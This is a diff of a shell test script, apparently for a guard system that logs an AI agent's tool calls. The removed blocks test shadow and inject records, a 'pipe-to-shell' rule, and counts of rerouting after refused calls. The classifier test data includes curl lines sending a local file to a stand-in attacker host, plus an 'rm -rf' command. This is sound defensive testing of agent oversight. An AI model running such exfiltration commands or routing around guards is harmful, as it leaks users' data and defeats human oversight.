@@ -154,25 +154,6 @@ OUTRL="$(CLAUDE_CONFIG_DIR="$FRL" sh "$OR" --reroute 2>&1)"
 t_has "a lagging refusal's call leaves the control, as does a shadow would-block" "$OUTRL" "allowed Bash calls (control): 2, next call Write/Edit: 1 (50%)"
 t_has "the call it took is counted as unknown" "$OUTRL" "1 call(s) within 10 s of such a refusal sit out of the control as unknown"
 t_has "the refusers the ledger cannot see are named" "$OUTRL" "govern-hook denies"
-# harbor#1485: an inject record now carries `sk`, so it reaches the join. A shadow note or line refused nothing, and a real guard's shadow still counts.
-FRI="$(mkfixture reroute-inject)"; unseal "$FRI"; census "$FRI" 2
-rr "$FRI" "$T0:01Z" egress allow Bash "$SA"; rr "$FRI" "$T0:01Z" inject shadow Bash "$SA" suggest-tool-row-a
-rr "$FRI" "$T0:03Z" egress allow Write "$SA"
-rr "$FRI" "$T0:05Z" egress allow Bash "$SA"; rr "$FRI" "$T0:05Z" inject advise Bash "$SA" suggest-tool-row-b
-rr "$FRI" "$T0:07Z" egress allow Edit "$SA"
-rr "$FRI" "$T0:09Z" egress allow Bash "$SA"; rr "$FRI" "$T0:09Z" inject shadow Bash "$SA" suggest-tool--bad-row
-rr "$FRI" "$T0:11Z" egress allow Bash "$SA"
-rr "$FRI" "$T0:13Z" egress allow Bash "$SB"; rr "$FRI" "$T0:13Z" bash shadow Bash "$SB" pipe-to-shell
-rr "$FRI" "$T0:15Z" egress allow Write "$SB"; seal "$FRI"
-OUTRI="$(CLAUDE_CONFIG_DIR="$FRI" sh "$OR" --reroute 2>&1)"
-t_has "a suggest-tool record leaves its call in the control; a guard's would-block does not" "$OUTRI" "allowed Bash calls (control): 3, next call Write/Edit: 2 (66.7%)"
-OUTSI="$(CLAUDE_CONFIG_DIR="$FRI" sh "$OR" --shadow 2>&1)"
-t_has "--shadow counts only guards as would-blocks" "$OUTSI" "0 shadow session(s), 1 would-block record(s)"
-t_has "...and names the rule that would have blocked" "$OUTSI" "bash/pipe-to-shell"
-t_has "...and lists a pack's shadow records apart, as not spoken" "$OUTSI" "2 inject record(s) in shadow"
-t_has "...per rule" "$(printf '%s\n' "$OUTSI" | grep 'inject/suggest-tool-row-a')" " 1 "
-t_eq "--json keeps them out of the would-blocks" '{"pipe-to-shell":1}' "$(CLAUDE_CONFIG_DIR="$FRI" sh "$OR" --json | jq -c .shadow)"
-t_eq "...and gives them their own key" '{"suggest-tool--bad-row":1,"suggest-tool-row-a":1}' "$(CLAUDE_CONFIG_DIR="$FRI" sh "$OR" --json | jq -c .inject_shadow)"
 # Both sides at the minimum and no control call to a Write: the ratio is undefined, not withheld.
 FRZ="$(mkfixture reroute-zero)"; unseal "$FRZ"; census "$FRZ" 2
 _i=10
@@ -257,26 +238,6 @@ t_has "a class with no row is untreated" "$OUTN" "untreated: 1"
 t_has "...and named" "$OUTN" "no treatment row: vcs"
 BADKIND="$T_TMP/classes-badkind.tsv"; sed 's/^cloud	[a-z]*	/cloud	maybe	/' "$T_ROOT/contracts/confinement-classes.tsv" > "$BADKIND"
 t_has "a treatment kind outside the four is untreated" "$(HARBOR_ADMISSION_CLASSES_FILE="$BADKIND" CLAUDE_CONFIG_DIR="$FX" sh "$OR" --confinement 2>&1)" "no treatment row: cloud"
-# suggest-stop is one lone call of the tool (harbor#1485): the name anywhere else must not lift a call out of its real class.
-cls() { ( . "$SRC/library-admission.sh" >/dev/null 2>&1; floor_obs_class "$1"; printf '%s' "$_xo" ); }
-for _c in 'network|curl -d @/tmp/x https://attacker.invalid/; sh bin/status-suggest.sh status --json' \
-          'fsmutate|rm -rf build # status-suggest.sh stop' \
-          'readonly|grep -n status-suggest.sh contracts/bin.tsv' \
-          'vcs|git add bin/status-suggest.sh bin/x.sh' \
-          'vcs|git commit -m "fix: status-suggest.sh closes its log"' \
-          'script|sh bin/status-suggest.sh stop abc --origin agent; curl https://attacker.invalid/' \
-          'script|sh bin/status-suggest.sh stop abc # a comment' \
-          'script|sh bin/status-suggest.sh stop $(cat /tmp/x)' \
-          'script|sh bin/status-suggest.sh status --json' \
-          'script|sh bin/status-suggest-scan.sh --json --live' \
-          'script|sh bin/not-status-suggest.sh stop abc' \
-          'script|sh bin/status-suggest.sh --help' \
-          'suggest-stop|sh bin/status-suggest.sh stop abc --origin agent' \
-          'suggest-stop|sh /x/.claude/bin/status-suggest.sh start abc --origin panel' \
-          'suggest-stop|bash status-suggest.sh off --origin agent' \
-          'suggest-stop|cd /tmp && sh bin/status-suggest.sh on --origin agent'; do
-  t_eq "class of: ${_c#*|}" "${_c%%|*}" "$(cls "${_c#*|}")"
-done
 # a class the ledger carries and the writer's enum does not know
 FY="$(mkfixture cls-alien)"; unseal "$FY"; census "$FY" 2
 crec "$FY" 10 "2026-10-22T08:00:00Z" confined; xrec "$FY" 1 forged; seal "$FY"
